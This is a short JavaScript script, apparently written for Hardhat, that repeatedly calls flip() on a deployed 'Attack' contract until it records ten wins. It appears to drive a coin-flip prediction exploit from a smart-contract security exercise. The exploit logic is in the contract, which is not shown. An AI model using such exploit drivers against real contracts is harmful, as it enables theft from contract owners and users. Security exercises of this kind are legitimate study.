log = console.log;
attackContractAddress = "0x11f379A2c18e2ac978963a8cD6C1Aa01daD840Bf"; // have to write the result of deploy_attack.js
(async () => {
  const account = await ethers.getSigner();
  const contract = await ethers.getContractAt("Attack", attackContractAddress, account);

  while(true){
    await contract.flip({gasLimit : 2e6});
    res = await contract.getWins();
    log(`result : ${res}`);
    if (res == 10){
      break
    }
  }

})();
